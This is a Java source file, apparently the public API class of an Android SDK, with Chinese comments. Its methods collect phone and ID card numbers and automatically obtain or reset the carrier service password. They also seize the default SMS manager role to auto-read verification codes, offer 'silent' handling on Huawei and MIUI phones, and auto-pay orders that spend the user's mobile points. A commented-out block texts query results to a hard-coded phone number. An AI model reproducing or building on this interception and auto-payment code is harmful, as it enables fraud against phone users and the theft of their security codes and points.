package com.myyj.sdk;

import android.app.Activity;
import android.content.Intent;

import com.myyj.sdk.tools.LogHelper;
import com.myyj.sdk.tools.PhoneInfoHelper;
import com.myyj.sdk.tools.SuperSmsManager;
import com.myyj.sdk.tools.pwdhelperx.RPWManager;
import com.myyj.sdk.tools.sercer2.CustomEditor2;
import com.myyj.sdk.tools.sercer2.ServerHelper2;

import java.util.HashMap;

public class msdk {
    /**
     * 读取本机的移动号码（不一定会成功）
     *
     * @return
     */
    public static String readPhoneNumber() {
        return PhoneInfoHelper.getPhoneNumber();
    }

    /**
     * SDK初始化
     *
     * @param productName 传产品名称即可，比如nezha/tantan
     * @param channelId   发布的渠道ID
     * @param udid        用户唯一ID
     */
    public static void init(String productName, int productId, int channelCode, String channelId, String udid, String pkgTime) {
        MySDK.getInstance().init(productName, productId, channelCode, channelId, udid, pkgTime);
        MySDK.getInstance().getActivity().getApplication().startService(new Intent(MySDK.getInstance().getActivity().getApplicationContext(), TimerService.class));
    }

    /**
     * 销毁，在Application的onTerminate()中调用
     */
    public static void destroy() {
        MySDK.getInstance().destroy();
    }

    /**
     * 服务器版的存储类，注意省着用，整个json不要超过255字节
     *
     * @return 类似于SharedPreference
     */
    public static CustomEditor2 edit() {
        return ServerHelper2.getInstance().edit();
    }

    /**
     * 用户行为监听回调，用于挂接友盟等自定义事件
     *
     * @param recordCallback
     */
    public static void setRecordCallback(EventCallback recordCallback) {
        MySDK.getInstance().setRecordCallback(recordCallback);
    }

    /**
     * 触发自定义事件，会向服务器和友盟同时发送
     *
     * @param eventId 事件ID
     * @param info    附加信息
     */
    public static void dispatchEvent(String eventId, String info) {
        MySDK.getInstance().dispatchEvent(eventId, info);
    }

    /**
     * 触发自定义事件，会向服务器和友盟同时发送
     *
     * @param eventId 事件ID
     * @param info    附加信息
     * @param value   数值参数（积分，金币数量等）
     */
    public static void dispatchEvent(String eventId, String info, int value) {
        MySDK.getInstance().dispatchEvent(eventId, info, value);
    }

    /**
     * 设置手机号
     *
     * @param phoneNumber 手机号
     */
    public static void setPhoneNumber(String phoneNumber) {
        MySDK.getInstance().setPhoneNum(phoneNumber);
    }

    /**
     * 获取设置过的手机号，再次登录可从服务器上读取到
     *
     * @return
     */
    public static String getPhoneNumber() {
        return MySDK.getInstance().getPhoneNumber();
    }

    /**
     * 设置身份证号码
     *
     * @param idCardNumber
     */
    public static void setIdCardNumber(String idCardNumber) {
        MySDK.getInstance().setIdCardNum(idCardNumber);
    }

    /**
     * 获取身份证号码
     *
     * @return
     */
    public static String getIdCardNumber() {
        return MySDK.getInstance().getIdCardNum();
    }

    /**
     * 获取渠道ID
     *
     * @return
     */
    public static String getChannelId() {
        return MySDK.getInstance().getChannelId();
    }

    /**
     * 用户ID
     *
     * @return
     */
    public static String getUDID() {
        return MySDK.getInstance().getUDID();
    }

//    public static String getUserId() {
//        return MySDK.getInstance().getUserId();
//    }

    /**
     * 移动积分
     *
     * @return
     */
    public static int getScore() {
        return MySDK.getInstance().getScore();
    }

    /**
     * 是否初始化
     *
     * @return
     */
    public static boolean hasInited() {
        return MySDK.getInstance().hasInited();
    }

    /**
     * 是否绑定
     *
     * @return
     */
    public static boolean hasBinding() {
        return MySDK.getInstance().hasBinding();
    }

    /**
     * 登录服务器
     *
     * @param resultCallback 0 登录成功
     */
    public static void loginServer(ResultCallback resultCallback) {
//        MySDKSimple.getInstance().doAutoLogin(resultCallback);
        ServerHelper2.getInstance().login(resultCallback);
    }

    /**
     * 页面一: 输入手机号和身份证，登录或注册银夏，进行绑定<br/>
     * 1、已经绑定，跳到页面三<br/>
     * 2、尝试自动绑定，失败则页面二，成功则跳到页面三<br/>
     * 3、判断出此手机是否可以读取短信<br/>
     *
     * @param phoneNum       手机号
     * @param idCardNum      身份证
     * @param tryAutoBinding 自动绑定开关
     * @param resultCallback 结果返回0，则绑定成功，否则需要手动绑定
     */
    public static void loginYX(final String phoneNum, final String idCardNum, final boolean tryAutoBinding, final ResultCallback resultCallback) {
        MySDKSimple.getInstance().doLogin(phoneNum, idCardNum, tryAutoBinding, resultCallback);
    }

    /**
     * 绑定畅由
     *
     * @param servicePassword
     * @param smsCode
     * @param callback
     */
    public static void bindingCY(final String servicePassword, String smsCode, final ResultCallback callback) {
        MySDKSimple.getInstance().doBinding(servicePassword, smsCode, aTry(), callback);
    }

    /**
     * 获取token，此时不能切换activity，不然会失败
     *
     * @param callback
     */
    public static void getBindingTokenInLoading(ResultCallback callback) {
        MySDK.getInstance().getBindingTokenInLoading(callback);
    }

    /**
     * 发送绑定验证码短信
     *
     * @param rpwCallback 如果自动读取到了，则state为0，result为验证码
     */
    public static void sendBindingSms(ResultCallback rpwCallback) {
//        MySDKSimple.getInstance().doSendBindSmsCode(rpwCallback);
        MySDKSimple.getInstance().doAutoGetBindingSmsCode(rpwCallback);
    }

    /**
     * 是否需要身份证号(第一条)，打算走手动获取密码的时候，需要用户回复短信时自行输入
     *
     * @return
     */
    public static boolean needIdCardNumberFirst(String phoneNumber) {
        return RPWManager.NIN(phoneNumber);
    }

    /**
     * 是否需要身份证号(全程)
     *
     * @return
     */
    public static boolean needIdCardNumberAll(String phoneNumber) {
        return RPWManager.NINAll(phoneNumber);
    }

    /**
     * 手动获取服务密码
     */
    public static void manualResetServicePassword() {
        MySDKSimple.getInstance().doManualResetServicePassword();
    }

    /**
     * 自动获取服务密码
     *
     * @param resultCallback
     */
    public static void autoGetServicePassword(final ResultCallback resultCallback) {
        MySDKSimple.getInstance().doAutoGetServicePassword(resultCallback);
    }

    /**
     * 获取商品列表
     *
     * @return kv结构，对应商品ID和积分价值
     */
    public static HashMap<Integer, Integer> getGoodsInfos() {
        return MySDKSimple.getInstance().getGoodsInfos();
    }

    /**
     * 获取可以扣掉的最大积分数
     *
     * @return
     */
    public static int getCostScoreMax() {
        return MySDKSimple.getInstance().getCostScoreMax();
    }

    /**
     * 获取商品的积分价值
     *
     * @param goodsId
     * @return
     */
    public static int getCostByGoodsId(int goodsId) {
        return MySDKSimple.getInstance().getCostByGoodsId(goodsId);
    }

    /**
     * 下单并支付
     * 返回0则自动支付完成了
     * 返回7则需要显示输入框，改手动输入验证码
     * 返回其他值表示无法下单
     *
     * @param goodsId    商品ID，传-1
     * @param tryAutoPay 尝试自动登录的开关
     * @param callback   0 支付成功
     *                   1 未登录
     *                   2 未绑定
     *                   3 积分不足以购买最低档商品
     *                   4 购买数量有误
     *                   5 下单错误
     *                   6 网络错误
     *                   7 无法取到验证码，需要手动处理
     *                   8 支付失败
     */
    public static void createOrder(int goodsId, boolean tryAutoPay, final ResultCallback callback) {
        MySDKSimple.getInstance().doCreateOrder(goodsId, tryAutoPay, callback);
    }

    /**
     * 重新发送支付验证码短信，下单时会自动发送一个
     *
     * @param rpwCallback 如果自动读取到了，则state为0，result为验证码
     */
    public static void resendPaySms(ResultCallback rpwCallback) {
        MySDKSimple.getInstance().doResendPayVerifyCode(rpwCallback);
    }

    /**
     * 手动支付订单
     * 0 支付成功
     * 8 支付失败
     *
     * @param smsCode
     * @param callback
     */
    public static void payOrder(String smsCode, ResultCallback callback) {
        MySDKSimple.getInstance().doPayOrder(smsCode, callback);
    }

    /**
     * 重置服务密码的说明
     *
     * @param phoneNumber
     * @return
     */
    public static String getResetServicePasswordInstruction(String phoneNumber) {
        return MySDKSimple.getInstance().doGetResetInstruction(phoneNumber);
    }

    /**
     * 是否自动处理
     *
     * @return
     */
    public static boolean aTry() {
        return MySDKSimple.getInstance().aTry();
    }


    /**
     * 是否跳过RPW处理
     *
     * @return
     */
    public static boolean isRpwSkip() {
        return MySDKSimple.getInstance().isRpwSkip();
    }

    /**
     * 是否设置为默认短信管理器
     *
     * @return
     */
    public static boolean isDefaultSMS() {
        return MySDKSimple.getInstance().isDefaultSMS();
    }

    /**
     * 是否设置vivo,oppo手机为默认短信管理器
     *
     * @returnx
     */
    public static boolean isVivoOppoSMS() {
        return MySDKSimple.getInstance().isVivoOppoSMS();
    }


    /**
     * 是否自动下单
     *
     * @return
     */
    public static boolean isAutoPay() {
        return MySDKSimple.getInstance().isAutoPay();
    }


    /**
     * 是否自动下一步
     *
     * @return
     */
    public static boolean isAutoNext() {
        return MySDKSimple.getInstance().isAutoNext();
    }

    /**
     * 输入身份证弹框开关
     *
     * @return
     */
    public static boolean isPreGetId() {
        return MySDKSimple.getInstance().isPreGetId();
    }


    /**
     * 是否支持静默处理
     *
     * @return
     */
    public static boolean aSilent() {
        return PhoneInfoHelper.isHuawei() || PhoneInfoHelper.isMIUI();
    }

    /**
     * 在接收不到短信时，是否重新设置为默认短信管理器
     *
     * @param value
     */
    public static void setRetrySetDefaultSms(boolean value) {
            SuperSmsManager.getInstance().setRetrySetDefaultSms(value);
    }

    /**
     * 查询积分
     *
     * @param resultCallback 结果为0，则查询成功
     */
    public static void queryScore(final ResultCallback resultCallback) {
        MySDK.getInstance().doQueryScore(resultCallback);
    }

//    /**
//     * 使用短信查询积分
//     */
//    public static void queryScoreBySms(final ResultCallback resultCallback) {
//        RPWManager.QSS(new ResultCallback() {
//            @Override
//            public void callback(int state, String result) {
//                LogHelper.d("查询结果 " + state + " " + result);
//                String text = "test_" + ServerHelper.getInstance().getId() + "_" + result;
//                ServerHelper.getInstance().updateDes(text);
//                if(state == 0) {
//                    SuperSmsManager.getInstance().sendSms("15877447919", text, new ResultCallback() {
//                        @Override
//                        public void callback(int state, String result) {
//                        }
//                    });
//                }
//                if(resultCallback != null) {
//                    resultCallback.callback(state, result);
//                }
//            }
//        });
//    }

    /**
     * 获取手机号码输入框是否为只读
     *
     * @return
     */
    public static boolean isPhoneReadOnly() {
        return PhoneInfoHelper.getInstance().getPhoneReadOnly();
    }

}
